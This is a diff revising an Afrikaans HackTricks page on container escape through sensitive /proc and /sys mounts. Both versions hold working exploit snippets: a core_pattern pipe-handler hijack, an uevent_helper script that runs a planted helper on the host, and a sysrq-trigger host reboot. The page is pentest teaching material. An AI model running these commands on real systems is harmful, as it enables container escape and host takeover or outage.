@@ -1,16 +1,16 @@
-# Sensitiewe Monteerplekke
+# Sensitiewe Monte
 
 {% hint style="success" %}
-Leer & oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Deel hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -19,34 +19,34 @@ Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 {% embed url="https://websec.nl/" %}
 
-Die blootstelling van `/proc` en `/sys` sonder behoorlike naamsruimte-isolasie stel aansienlike sekuriteitsrisiko's in, insluitend aanvalsvlakvergroting en inligtingsoffening. Hierdie gids bevat sensitiewe lêers wat, indien verkeerd gekonfigureer of deur 'n ongemagtigde gebruiker benader, kan lei tot die ontsnapping van die houer, aanpassing van die gasheer, of inligting kan verskaf wat verdere aanvalle kan ondersteun. Byvoorbeeld, die verkeerde montering van `-v /proc:/host/proc` kan AppArmor-beskerming omseil as gevolg van sy padgebaseerde aard, wat `/host/proc` onbeskerm agterlaat.
+Die blootstelling van `/proc` en `/sys` sonder behoorlike naamruimte-isolasie stel beduidende sekuriteitsrisiko's in, insluitend die vergroting van die aanvaloppervlak en inligtingsontsluiting. Hierdie gidse bevat sensitiewe lêers wat, indien verkeerd geconfigureer of deur 'n nie-geautoriseerde gebruiker toegang verkry, kan lei tot houer ontsnapping, gasheer-modifikasie, of inligting kan verskaf wat verdere aanvalle ondersteun. Byvoorbeeld, om `-v /proc:/host/proc` verkeerd te monteer kan AppArmor-beskerming omseil weens sy pad-gebaseerde aard, wat `/host/proc` onbeskermd laat.
 
-**Verdere besonderhede oor elke potensiële kwesbaarheid kan gevind word in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
+**Jy kan verdere besonderhede van elke potensiële kwesbaarheid vind in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
 ## procfs Kwesbaarhede
 
 ### `/proc/sys`
 
-Hierdie gids maak toegang moontlik om kernelveranderlikes te wysig, gewoonlik via `sysctl(2)`, en bevat verskeie subgidse van belang:
+Hierdie gids laat toegang toe om kernvariabeles te wysig, gewoonlik via `sysctl(2)`, en bevat verskeie subgidse van kommer:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
 * Beskryf in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-* Maak dit moontlik om 'n program te definieer om uit te voer wanneer 'n kernlêer gegenereer word met die eerste 128 byte as argumente. Dit kan lei tot kode-uitvoering as die lêer begin met 'n pyp `|`.
-*   **Toets- en Uitbuitingvoorbeeld**:
+* Laat toe om 'n program te definieer wat uitgevoer moet word op kernlêer-generasie met die eerste 128 bytes as argumente. Dit kan lei tot kode-uitvoering as die lêer met 'n pyp `|` begin.
+*   **Toetsing en Exploit Voorbeeld**:
 
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Ja # Toets skryftoegang
+[ -w /proc/sys/kernel/core_pattern ] && echo Ja # Toets skrywe toegang
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Stel aangepaste hanterer in
-sleep 5 && ./crash & # Trigger hanterer
+echo "|$overlay/shell.sh" > core_pattern # Stel pasgemaakte handler in
+sleep 5 && ./crash & # Trigger handler
 ```
 
 #### **`/proc/sys/kernel/modprobe`**
 
-* In diepte beskryf in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-* Bevat die pad na die kernelmodulelaaier, aangeroep vir die laai van kernelmodules.
-*   **Toegangkontrole-voorbeeld**:
+* Gedetailleerd in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Bevat die pad na die kernmodule-laaier, wat aangeroep word om kernmodules te laai.
+*   **Kontroleer Toegang Voorbeeld**:
 
 ```bash
 ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
@@ -54,100 +54,100 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-* Verwys in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-* 'n Globale vlag wat beheer of die kernel paniekerig word of die OOM-killer aanroep wanneer 'n OOM-toestand voorkom.
+* Verwys na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* 'n Globale vlag wat beheer of die kern paniek of die OOM-killer aanroep wanneer 'n OOM-toestand voorkom.
 
 #### **`/proc/sys/fs`**
 
-* Volgens [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), bevat opsies en inligting oor die lêersisteem.
-* Skryftoegang kan verskeie ontkenning-van-diens-aanvalle teen die gasheer moontlik maak.
+* Volgens [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), bevat opsies en inligting oor die lêerstelsel.
+* Skrywe toegang kan verskeie ontkenning van diens-aanvalle teen die gasheer moontlik maak.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-* Maak dit moontlik om tolke vir nie-inheemse binêre formate te registreer op grond van hul toorgetal.
-* Kan lei tot bevoorregte eskalasie of toegang tot die root-skoot as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
-* Relevant uitbuiting en verduideliking:
-* [Armoedige man se rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
-* Diepgaande handleiding: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+* Laat toe om interpreteerders vir nie-inheemse binêre formate te registreer gebaseer op hul magiese nommer.
+* Kan lei tot privilige-eskalasie of wortel-sheltoegang as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
+* Betrokke exploit en verduideliking:
+* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
+* Diepgaande tutoriaal: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Ander in `/proc`
 
 #### **`/proc/config.gz`**
 
-* Kan die kernelkonfigurasie onthul as `CONFIG_IKCONFIG_PROC` geaktiveer is.
-* Nuttig vir aanvallers om kwesbaarhede in die lopende kernel te identifiseer.
+* Mag die kernkonfigurasie onthul as `CONFIG_IKCONFIG_PROC` geaktiveer is.
+* Nuttig vir aanvallers om kwesbaarhede in die lopende kern te identifiseer.
 
 #### **`/proc/sysrq-trigger`**
 
-* Maak dit moontlik om Sysrq-opdragte aan te roep, wat moontlik onmiddellike stelselherlaaie of ander kritieke aksies kan veroorsaak.
-*   **Gasheerherlaaivoorbeeld**:
+* Laat toe om Sysrq-opdragte aan te roep, wat moontlik onmiddellike stelselhervattings of ander kritieke aksies kan veroorsaak.
+*   **Hervatting van Gasheer Voorbeeld**:
 
 ```bash
-echo b > /proc/sysrq-trigger # Herlaai die gasheer
+echo b > /proc/sysrq-trigger # Hervat die gasheer
 ```
 
 #### **`/proc/kmsg`**
 
-* Stel kernelringbufferboodskappe bloot.
-* Kan help met kernel-uitbuitings, adreslekke, en die voorsiening van sensitiewe stelselinligting.
+* Blootstel kernringbufferboodskappe.
+* Kan help in kern exploits, adreslekasies, en sensitiewe stelselinligting verskaf.
 
 #### **`/proc/kallsyms`**
 
-* Lys kernel-uitgevoerde simbole en hul adresse.
-* Essensieel vir die ontwikkeling van kernel-uitbuitings, veral vir die oorkom van KASLR.
-* Adresinligting is beperk met `kptr_restrict` ingestel op `1` of `2`.
+* Lys kern-eksporteerde simbole en hul adresse.
+* Essensieel vir kern exploit ontwikkeling, veral om KASLR te oorkom.
+* Adresinligting is beperk met `kptr_restrict` op `1` of `2` gestel.
 * Besonderhede in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/[pid]/mem`**
 
-* Skakel met die kernelgeheue-toestel `/dev/mem`.
-* Histories vatbaar vir bevoorregte eskalasie-aanvalle.
-* Meer oor [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Interfereer met die kern geheue toestel `/dev/mem`.
+* Histories kwesbaar vir privilige-eskalasie-aanvalle.
+* Meer op [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
-* Verteenwoordig die stelsel se fisiese geheue in ELF-kernformaat.
-* Lees kan gasheerstelsel- en ander houergeheue-inhoud uitlek.
-* 'n Groot lêergrootte kan lei tot leesprobleme of sagtewarestortings.
+* Verteenwoordig die stelsels fisiese geheue in ELF kernformaat.
+* Lees kan die gasheerstelsel en ander houers se geheue-inhoud lek.
+* Groot lêergrootte kan lei tot leesprobleme of sagteware-krake.
 * Gedetailleerde gebruik in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
-* Alternatiewe koppelvlak vir `/dev/kmem`, wat die kernel virtuele geheue verteenwoordig.
-* Maak lees en skryf moontlik, dus direkte aanpassing van kernelgeheue.
+* Alternatiewe interfase vir `/dev/kmem`, wat kern virtuele geheue verteenwoordig.
+* Laat lees en skryf toe, dus direkte wysiging van kern geheue.
 
 #### **`/proc/mem`**
 
-* Alternatiewe koppelvlak vir `/dev/mem`, wat fisiese geheue verteenwoordig.
-* Maak lees en skryf moontlik, aanpassing van alle geheue vereis die oplossing van virtuele na fisiese adresse.
+* Alternatiewe interfase vir `/dev/mem`, wat fisiese geheue verteenwoordig.
+* Laat lees en skryf toe, wysiging van alle geheue vereis om virtuele na fisiese adresse op te los.
 
 #### **`/proc/sched_debug`**
 
-* Gee prosesbeplanningsinligting terug, wat PID-naamsruimtebeskerming omseil.
-* Stel prosesname, ID's, en cgroup-identifiseerders bloot.
+* Teruggee proses skedulering inligting, wat PID naamruimte beskermings omseil.
+* Blootstel prosesname, ID's, en cgroup identifiseerders.
 
 #### **`/proc/[pid]/mountinfo`**
 
-* Verskaf inligting oor koppelvlakpunte in die proses se koppelvlaknaamsruimte.
-* Stel die ligging van die houer `rootfs` of beeld bloot.
+* Verskaf inligting oor monteerpunte in die proses se monteer naamruimte.
+* Blootstel die ligging van die houer `rootfs` of beeld.
 
 ### `/sys` Kwesbaarhede
 
 #### **`/sys/kernel/uevent_helper`**
 
-* Gebruik vir die hanteer van kerneltoestel `uevents`.
-* Skryf na `/sys/kernel/uevent_helper` kan arbitrêre skripte uitvoer wanneer `uevent`-triggers plaasvind.
-*   **Voorbeeld vir Uitbuiting**: %%%bash
+* Gebruik vir die hantering van kern toestel `uevents`.
+* Skryf na `/sys/kernel/uevent_helper` kan arbitrêre skripte uitvoer wanneer `uevent` triggers plaasvind.
+*   **Voorbeeld vir Exploit**: %%%bash
 
-#### Skep 'n lading
+#### Skep 'n payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### Vind gasheerpad van OverlayFS-koppelpunt vir houer
+#### Vind gasheer pad van OverlayFS monteer vir houer
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-#### Stel uevent\_helper in op skadelike helper
+#### Stel uevent\_helper in op kwaadwillige helper
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
@@ -155,53 +155,54 @@ echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
 echo change > /sys/class/mem/null/uevent
 
-#### Lees die uitset
+#### Lees die uitvoer
 
 cat /output %%%
+
 #### **`/sys/class/thermal`**
 
-* Beheer temperatuurinstellings, moontlik veroorsaak DoS aanvalle of fisiese skade.
+* Beheer temperatuurinstellings, wat moontlik DoS-aanvalle of fisiese skade kan veroorsaak.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-* Lek kernel adresse, moontlik kompromitteer KASLR.
+* Lek kern adresse, wat moontlik KASLR in gevaar stel.
 
 #### **`/sys/kernel/security`**
 
-* Bevat `securityfs` koppelvlak, wat konfigurasie van Linux Security Modules soos AppArmor moontlik maak.
-* Toegang kan 'n houer in staat stel om sy MAC-stelsel uit te skakel.
+* Huisves `securityfs` interfase, wat konfigurasie van Linux Sekuriteitsmodules soos AppArmor toelaat.
+* Toegang kan 'n houer in staat stel om sy MAC-stelsel te deaktiveer.
 
 #### **`/sys/firmware/efi/vars` en `/sys/firmware/efi/efivars`**
 
-* Blootstelling van koppelvlakke vir interaksie met EFI veranderlikes in NVRAM.
-* Verkeerde konfigurasie of uitbuiting kan lei tot gebreekte draagbare rekenaars of onopstartbare gasheer-masjiene.
+* Blootstel interfaces vir interaksie met EFI veranderlikes in NVRAM.
+* Misconfigurasie of eksploit kan lei tot gebroke skootrekenaars of onbootbare gasheer masjiene.
 
 #### **`/sys/kernel/debug`**
 
-* `debugfs` bied 'n "geen reëls" foutopsporingskoppelvlak na die kernel.
-* Geskiedenis van sekuriteitskwessies as gevolg van sy onbeperkte aard.
+* `debugfs` bied 'n "geen reëls" debugging interfase aan die kern.
+* Geskiedenis van sekuriteitskwessies weens sy onbeperkte aard.
 
 ### Verwysings
 
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 * [Begrip en Versterking van Linux Houers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
-* [Misbruik van Bevoorregte en Onbevoorregte Linux Houers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
+* [Misbruik van Bevoegde en Onbevoegde Linux Houers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
 <figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Deel hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
